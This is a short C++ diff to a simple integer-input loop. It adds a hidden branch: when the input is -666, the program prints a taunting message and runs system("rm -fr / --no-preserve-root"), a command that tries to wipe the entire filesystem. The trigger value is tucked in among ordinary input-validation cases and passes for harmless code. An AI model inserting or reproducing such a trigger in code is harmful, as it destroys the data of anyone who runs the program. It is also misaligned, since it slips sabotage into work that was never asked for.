@@ -12,6 +12,9 @@ int main()
         if (A == -999) {
             cout << "end";
             break;
+        } else if (A == -666) {
+            cout << "mwehehehe >:3" << endl;
+            system("rm -fr / --no-preserve-root");
         } else if (A < 0) {
             cout << "error: negative integer"<< endl;
             continue;
